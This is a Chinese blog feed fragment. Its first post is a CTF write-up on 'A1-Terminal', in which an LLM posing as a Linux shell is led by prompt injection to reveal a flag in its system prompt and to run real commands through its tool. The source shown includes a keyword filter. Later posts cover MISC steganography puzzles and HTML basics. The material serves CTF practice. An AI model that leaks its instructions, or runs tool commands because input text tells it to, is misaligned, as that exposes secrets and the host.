<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><p>赛后复现发现自己真是个铸币唉唉，其实三个都是最简单的RCE</p>
<p>挂个源码</p>
<pre><code class="highlight python"><span class="keyword">class</span> <span class="title class_">CommandExecuter</span>(<span class="title class_ inherited__">BaseAI</span>):
    tools = [
        &#123;
            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>,
            <span class="string">&quot;function&quot;</span>: &#123;
                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;execute_safe_linux_command&quot;</span>,
                <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Execute a safe command on a linux machine and return the result&quot;</span>,
                <span class="string">&quot;parameters&quot;</span>: &#123;
                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,
                    <span class="string">&quot;properties&quot;</span>: &#123;
                        <span class="string">&quot;command&quot;</span>: &#123;
                            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,
                            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;A linux command, e.g. `ls`&quot;</span>,
                        &#125;
                    &#125;,
                    <span class="string">&quot;required&quot;</span>: [<span class="string">&quot;command&quot;</span>],
                &#125;,
            &#125;,
        &#125;,
    ]

    prompt = <span class="string">f&quot;&quot;&quot;</span>
<span class="string">Please act as a Linux terminal shell and simulate `Ubuntu 24.04.1 LTS`.</span>
<span class="string">The user will input a command, and you must reply with the result output after executing the command.</span>
<span class="string">Now logined user is `ctfer`, current dir is `/`, and hostname is `a1natas`.</span>
<span class="string">The flag file is located in `/flag`, and its content is `<span class="subst">&#123;FLAG1&#125;</span>`.</span>
<span class="string">You can not reply to any Chinese or English statements. You can only reply to the output result after executing the terminal shell command.</span>
<span class="string">For example, if user input `whoami`, you should reply with user `ctfer`.</span>
<span class="string">If user input any other safe linux commands, you should execute it and return the result.</span>
<span class="string">The execution result must only be the `stdout/stderr` after the command is executed, and must not include the content of the PS1 environment of the terminal.</span>
<span class="string">Do not display the username and host information, for exmaple, never let `ctfer@a1natas:/$` in your reply!</span>
<span class="string">Prohibit outputting content unrelated to the shell execution result output, such as `click here to edit the content.` or `Note: xxx`!</span>
<span class="string">Under no circumstances should empty content be returned!</span>
<span class="string">&quot;&quot;&quot;</span>.strip()

    <span class="keyword">def</span> <span class="title function_">get_command_result</span>(<span class="params">self, command: <span class="built_in">str</span></span>):
        command = command.strip()
        <span class="keyword">match</span> command:
            <span class="keyword">case</span> <span class="string">&quot;whoami&quot;</span>:
                <span class="keyword">return</span> <span class="string">&quot;ctfer&quot;</span>
            <span class="keyword">case</span> <span class="string">&quot;pwd&quot;</span>:
                <span class="keyword">return</span> <span class="string">&quot;/&quot;</span>
            <span class="keyword">case</span> <span class="string">&quot;id&quot;</span>:
                <span class="keyword">return</span> <span class="string">&quot;uid=1000(ctfer) gid=1000(ctfer) groups=1000(ctfer)&quot;</span>
            <span class="keyword">case</span> _:
                <span class="keyword">if</span> command.startswith(<span class="string">&quot;hostname&quot;</span>):
                    <span class="keyword">return</span> <span class="string">&quot;a1natas&quot;</span>
                <span class="keyword">if</span> command.startswith(<span class="string">&quot;ls&quot;</span>):
                    <span class="keyword">return</span> <span class="string">&quot;bin dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var&quot;</span>
                <span class="keyword">if</span> <span class="built_in">any</span>([x <span class="keyword">in</span> command <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;proc/&quot;</span>, <span class="string">&quot;.sh&quot;</span>, <span class="string">&quot;.py&quot;</span>, <span class="string">&quot;env&quot;</span>]]):
                    <span class="keyword">return</span> <span class="string">&quot;Permission denied&quot;</span>
                <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> command:
                    <span class="keyword">return</span> <span class="string">&quot;A1CTF&#123;wood_give_you_this_fake_flag!&#125;&quot;</span>

        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(t_locals, <span class="string">&quot;thread_messages&quot;</span>):
            t_locals.thread_messages = [<span class="variable language_">self</span>.system_message(<span class="variable language_">self</span>.prompt)]

        <span class="keyword">try</span>:
            thread_messages = t_locals.thread_messages
            thread_messages.append(<span class="variable language_">self</span>.user_message(command))
            ai_result = <span class="variable language_">self</span>.send_messages(thread_messages)
            thread_messages.append(ai_result)

            <span class="keyword">if</span> <span class="keyword">not</span> ai_result.tool_calls:
                <span class="keyword">if</span> ai_result.content.startswith(<span class="string">&quot;```&quot;</span>) <span class="keyword">and</span> ai_result.content.endswith(
                    <span class="string">&quot;```&quot;</span>
                ):
                    ai_result.content = <span class="string">&quot;\n&quot;</span>.join(ai_result.content.splitlines()[<span class="number">1</span>:-<span class="number">1</span>])
                <span class="keyword">return</span> ai_result.content

            tool = ai_result.tool_calls[<span class="number">0</span>]
            function_name = tool.function.name
            function_args = tool.function.arguments

            exec_res = <span class="string">&quot;command not found&quot;</span>
            <span class="keyword">if</span> function_name == <span class="string">&quot;execute_safe_linux_command&quot;</span>:
                args = json_loads(function_args)
                <span class="keyword">while</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(args, <span class="built_in">dict</span>):
                    args = json_loads(args)
                <span class="keyword">if</span> cmd := args.get(<span class="string">&quot;command&quot;</span>):
                    exec_res = <span class="variable language_">self</span>.execute_safe_linux_command(cmd)

            thread_messages.append(<span class="variable language_">self</span>.tool_message(tool.<span class="built_in">id</span>, exec_res))
            ai_result = <span class="variable language_">self</span>.send_messages(thread_messages)

            <span class="keyword">if</span> ai_result.content.startswith(<span class="string">&quot;```&quot;</span>) <span class="keyword">and</span> ai_result.content.endswith(
                <span class="string">&quot;```&quot;</span>
            ):
                ai_result.content = <span class="string">&quot;\n&quot;</span>.join(ai_result.content.splitlines()[<span class="number">1</span>:-<span class="number">1</span>])

            thread_messages.append(ai_result)

            <span class="keyword">return</span> ai_result.content
        <span class="keyword">except</span> Exception:
            <span class="keyword">from</span> traceback <span class="keyword">import</span> format_exc

            <span class="built_in">print</span>(<span class="string">f&quot;get_command_result error: <span class="subst">&#123;format_exc()&#125;</span>\n\n&quot;</span>)
            <span class="keyword">return</span> <span class="string">&quot;Runtime Error...&quot;</span>

    <span class="keyword">def</span> <span class="title function_">execute_safe_linux_command</span>(<span class="params">self, command: <span class="built_in">str</span></span>):
        process = Popen(
            [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command],
            stdout=PIPE,
            stderr=PIPE,
            user=<span class="string">&quot;ctfer&quot;</span>,
            env=&#123;<span class="string">&quot;flag&quot;</span>: FLAG3&#125;,
            text=<span class="literal">True</span>,
        )
        <span class="keyword">try</span>:
            stdout, stderr = <span class="built_in">map</span>(<span class="built_in">str</span>.strip, process.communicate(timeout=<span class="number">60</span>))

            <span class="keyword">if</span> stdout:
                <span class="keyword">return</span> stdout
            <span class="keyword">elif</span> stderr:
                <span class="keyword">return</span> stderr
            <span class="keyword">return</span> <span class="string">f&quot;/bin/sh: <span class="subst">&#123;command.split()[<span class="number">0</span>]&#125;</span>: command not found&quot;</span>
        <span class="keyword">except</span> TimeoutExpired:
            process.kill()
            <span class="keyword">return</span> <span class="string">&quot;Command timeout&quot;</span></code></pre>



<h3 id="A1-Terminal-Part1"><a href="#A1-Terminal-Part1" class="headerlink" title="A1-Terminal Part1"></a>A1-Terminal Part1</h3><p>题面什么提示都没有，自己试一下基础操作</p>
<p>根据源码可以知道其实你输完整的关键词是包褒姒的</p>
<p>尝试一下模糊匹配吧</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145239677.png" alt="image-20250408145239677"></p>
<p><code>A1CTF&#123;P@RT1_Promp7_INJ3c7i0n_15_Fun!&#125;</code></p>
<h3 id="A1-Terminal-Part2"><a href="#A1-Terminal-Part2" class="headerlink" title="A1-Terminal Part2"></a>A1-Terminal Part2</h3><p>试着输一下一些蜜汁语句()</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145438003.png" alt="image-20250408145438003"></p>
<p>输入有效的LInux语句，那么尝试把我的输入让他执行</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145317166.png" alt="image-20250408145317166"></p>
<h3 id="A1-Terminal-Part3"><a href="#A1-Terminal-Part3" class="headerlink" title="A1-Terminal Part3"></a>A1-Terminal Part3</h3><p>呃呃其实是先做part3更好()</p>
<p>尝试直接以普通带过滤的rce打</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145828093.png" alt="image-20250408145828093"></p>
<p>。好的,输入被手动夹断了，其他方式他也识别不出来</p>
<p>那么就交给他执行算了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250408145312540.png" alt="image-20250408145312540"></p>
]]></content>
      <tags>
        <tag>-WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU—MISC刷题记录</title>
    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
<p>主要是HTTP流量，直接追踪流</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
<p>用<code>captfencoder</code>MD5一下结束战斗</p>
<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
<p>查完没有藏文件，那应该就是隐写了</p>
<p>结果没有发现隐写，感觉被骗了</p>
<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
<p>成功了，打开提取的文件发现有PK头</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
<p>foremost出一下，要密码，先尝试弱密码爆破</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
<p>看来是改了后缀，010先查查看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
<p>演都不演了…</p>
<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
<p>盯完帧没有东西，看看副本，发现已经损坏</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
<p>（这里-其实是_）</p>
<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
<blockquote>
<p>[!NOTE]</p>
<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
</blockquote>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
crc32 flag.jpg</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
<p>水平有限，还是手敲罢</p>
<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
<p>鉴定为图片纯纯的诈骗（恼</p>
<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
<p>要画图，那么应该藏了坐标，010查一下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
<blockquote>
<p>随波逐流</p>
</blockquote>
<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
<blockquote>
<p>脚本画图</p>
</blockquote>
<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
<p>​	<code>*gnuplot*</code>绘图</p>
<p>贴个脚本先</p>
<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
    re = res.read()
    res.close()
    
with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        for j in range(0, len(tem)):
            if tem[j] == &#x27;,&#x27;:
                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()</code></pre>

<p>得到去括号，去逗号的坐标值</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
<p>贴一下ubuntu下的下载和使用方法</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
gnuplot
plot <span class="string">&quot;output.txt&quot;</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
<p>可以扫出来</p>
<p>​	<em>matplotlib</em>绘图</p>
<p>把原文本去括号，用脚本跑</p>
<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
import numpy as np
with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
    re = res.read()
    res.close()

with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()
x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
plt.plot(x, y, &#x27;.&#x27;)
plt.show()</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML学习以及网页搭建初实践</title>
    <url>/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h1 id="HTML学习以及网页搭建初实践"><a href="#HTML学习以及网页搭建初实践" class="headerlink" title="HTML学习以及网页搭建初实践"></a>HTML学习以及网页搭建初实践</h1><p>学XSS一大家子时发现前端不仔细了解一下学习很难进行下去啊，于是就想先简单学习一下html来做一个铺垫</p>
<h2 id="HTML实例的基本结构"><a href="#HTML实例的基本结构" class="headerlink" title="HTML实例的基本结构"></a>HTML实例的基本结构</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" alt="02A7DD95-22B4-4FB9-B994-DDB5393F7F03"></p>
<ul>
<li><strong><!DOCTYPE html></strong> 声明为 HTML5 文档</li>
<li><strong><html></html></strong> 元素是 HTML 页面的根元素</li>
<li><strong><head></head></strong> 元素包含了文档的元（meta）数据，如 <strong><meta charset="utf-8"></strong> 定义网页编码格式为 <strong>utf-8</strong>。</li>
<li><strong><title></title></strong> 元素描述了文档的标题</li>
<li><strong><body></body></strong> 元素包含了可见的页面内容</li>
<li><strong><h1></h1></strong> 元素定义一个大标题</li>
<li><strong><p></p></strong> 元素定义一个段落</li>
</ul>
<p>其实F12查一下源代码就能知道是大致怎么样个结构</p>
<h2 id="什么是-HTML"><a href="#什么是-HTML" class="headerlink" title="什么是 HTML?"></a>什么是 HTML?</h2><p>HTML 是用来描述网页的一种语言。</p>
<ul>
<li>HTML 指的是超文本标记语言: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</li>
<li>HTML 不是一种编程语言，而是一种<strong>标记</strong>语言</li>
<li>标记语言是一套<strong>标记标签</strong> (markup tag)</li>
<li>HTML 使用标记标签来<strong>描述</strong>网页</li>
<li>HTML 文档包含了HTML <strong>标签</strong>及<strong>文本</strong>内容</li>
<li>HTML文档也叫做 <strong>web 页面</strong></li>
</ul>
<h2 id="HTML-标签"><a href="#HTML-标签" class="headerlink" title="HTML 标签"></a>HTML 标签</h2><p>HTML 标记标签通常被称为 HTML 标签 (HTML tag)。</p>
<ul>
<li>HTML 标签是由<em>尖括号</em>包围的关键词，比如 <html></html></li>
<li>HTML 标签通常是<em>成对出现</em>的，比如 <b> 和 </b></li>
<li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li>
<li>开始和结束标签也被称为<em>开放标签</em>和<em>闭合标签</em></li>
</ul>
<p>&lt;标签&gt;内容&lt;&#x2F;标签&gt;</p>
<hr>
<h2 id="HTML-元素"><a href="#HTML-元素" class="headerlink" title="HTML 元素"></a>HTML 元素</h2><p>“HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思.</p>
<p>但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签，如下实例:</p>
<p>HTML 元素:</p>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>

<h3 id><a href="#" class="headerlink" title="&lt;div&gt;"></a><code>&lt;div&gt;</code></h3><p>内容划分元素，通过div与class的搭配轻松将页面划分为多个不同模块</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="&lt;a&gt;"></a><code>&lt;a&gt;</code></h3><p>锚元素，通过其的herf属性来引用其他网页&#x2F;本地的文件</p>
<ul>
<li><p>实例</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.mozilla.com&quot;&gt; Mozilla &lt;/a&gt; 
//绝对地址引用
&lt;a href=&quot;//example.com&quot;&gt;相对于协议的 URL&lt;/a&gt;
&lt;a href=&quot;/zh-CN/docs/Web/HTML&quot;&gt;相对于源的 URL&lt;/a&gt;
&lt;a href=&quot;./p&quot;&gt;相对于路径的 URL&lt;/a&gt;
//相对地址的链接
&lt;!-- &lt;a&gt; 元素链接到下面部分 --&gt;
&lt;p&gt;&lt;a href=&quot;#Section_further_down&quot;&gt; 跳转到下方标题 &lt;/a&gt;&lt;/p&gt;

&lt;!-- 要链接到的标题 --&gt;
&lt;h2 id=&quot;Section_further_down&quot;&gt;更下面的部分&lt;/h2&gt;
//同页面链接</code></pre>

<p>当然，你也可以将<code>&lt;a&gt;</code>插入在段落中达到引用的效果</p>
<h3 id="待补全中。。。"><a href="#待补全中。。。" class="headerlink" title="(待补全中。。。)"></a>(待补全中。。。)</h3></li>
</ul>
<h2 id="网页结构"><a href="#网页结构" class="headerlink" title="网页结构"></a>网页结构</h2><p>一般分为head和body</p>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">html</span>&gt;</span>
	<span class="tag">&lt;<span class="name">head</span>&gt;</span>
    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span>
	<span class="tag">&lt;/<span class="name">head</span>&gt;</span>
	<span class="tag">&lt;<span class="name">body</span>&gt;</span>
        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>小标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
        <span class="tag">&lt;<span class="name">p</span>&gt;</span>正文<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>
<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>

<p>只有body部分会在网页中显示</p>
<h2 id="HTML版本"><a href="#HTML版本" class="headerlink" title="HTML版本"></a>HTML版本</h2><p>从初期的网络诞生后，已经出现了许多HTML版本:</p>
<table>
<thead>
<tr>
<th align="left">版本</th>
<th align="left">发布时间</th>
</tr>
</thead>
<tbody><tr>
<td align="left">HTML</td>
<td align="left">1991</td>
</tr>
<tr>
<td align="left">HTML+</td>
<td align="left">1993</td>
</tr>
<tr>
<td align="left">HTML 2.0</td>
<td align="left">1995</td>
</tr>
<tr>
<td align="left">HTML 3.2</td>
<td align="left">1997</td>
</tr>
<tr>
<td align="left">HTML 4.01</td>
<td align="left">1999</td>
</tr>
<tr>
<td align="left">XHTML 1.0</td>
<td align="left">2000</td>
</tr>
<tr>
<td align="left">HTML5</td>
<td align="left">2012</td>
</tr>
<tr>
<td align="left">XHTML5</td>
<td align="left">2013</td>
</tr>
</tbody></table>
<hr>
<h2 id="声明"><a href="#声明" class="headerlink" title="&lt;!DOCTYPE&gt; 声明"></a>&lt;!DOCTYPE&gt; 声明</h2><!DOCTYPE><p>声明有助于浏览器中正确显示网页。</p>
<p>网络上有很多不同的文件，如果能够正确声明HTML的版本，浏览器就能正确显示网页内容。</p>
<p>doctype 声明是不区分大小写的，以下方式均可：</p>
<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>

<span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span>

<span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span>

